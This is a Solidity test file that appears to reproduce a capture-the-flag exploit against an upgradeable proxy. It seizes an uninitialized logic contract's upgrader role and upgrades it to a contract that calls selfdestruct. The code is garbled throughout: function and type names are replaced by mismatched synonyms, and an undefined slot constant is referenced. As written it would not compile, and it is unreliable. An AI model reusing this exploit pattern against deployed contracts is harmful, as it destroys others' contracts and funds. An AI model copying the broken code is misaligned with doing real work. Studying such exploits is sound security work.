pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract AgreementTest is Test {
    Engine EnginePact;
    Motorbike MotorbikePact;
    QuestRunner QuestrunnerAgreement;

    function testUninitialized() public {
        EnginePact = new Engine();
        MotorbikePact = new Motorbike(address(EnginePact));
        QuestrunnerAgreement = new QuestRunner();


        console.record("Unintialized Upgrader:", EnginePact.upgrader());

        address(EnginePact).call(abi.encodeWithSignature("initialize()"));

        console.record("Initialized Upgrader:", EnginePact.upgrader());

        bytes memory initEncoded = abi.encodeWithSignature("operate()");
        address(EnginePact).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(QuestrunnerAgreement),
                initEncoded
            )
        );

        console.record("operate completed");
        console.record("Since EngineContract destroyed, next call will fail.");
        address(EnginePact).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(QuestrunnerAgreement),
                initEncoded
            )
        );
    }
}

contract Motorbike {

    bytes32 internal constant _execution_position =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct ZonePosition {
        address magnitude;
    }


    constructor(address _logic) {
        require(
            Address.isPact(_logic),
            "ERC1967: new implementation is not a contract"
        );
        _retrieveRealmPosition(_execution_position).magnitude = _logic;
        (bool victory, ) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(victory, "Call failed");
    }


    function _delegate(address realization) internal virtual {

        assembly {
            calldatacopy(0, 0, calldatasize())
            let outcome := delegatecall(
                gas(),
                realization,
                0,
                calldatasize(),
                0,
                0
            )
            returndatacopy(0, 0, returndatasize())
            switch outcome
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }


    fallback() external payable virtual {
        _delegate(_retrieveRealmPosition(_execution_position).magnitude);
    }


    function _retrieveRealmPosition(
        bytes32 space
    ) internal pure returns (ZonePosition storage r) {
        assembly {
            r.space := space
        }
    }
}

contract Engine is Initializable {

    bytes32 internal constant _execution_position =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horseMight;

    struct ZonePosition {
        address magnitude;
    }

    function launchAdventure() external initializer {
        horseMight = 1000;
        upgrader = msg.sender;
    }


    function improveTargetAndInvokespell(
        address updatedExecution,
        bytes memory info
    ) external payable {
        _authorizeEnhance();
        _improveDestinationAndSummonhero(updatedExecution, info);
    }


    function _authorizeEnhance() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }


    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {

        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    event Returny(uint256);

    function greetMe() public {
        emit Returny(0x42);
    }


    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            "ERC1967: new implementation is not a contract"
        );

        AddressSlot storage r;
        assembly {
            r.slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}

contract Operator {
    function operate() external {
        selfdestruct(payable(msg.sender));
    }
}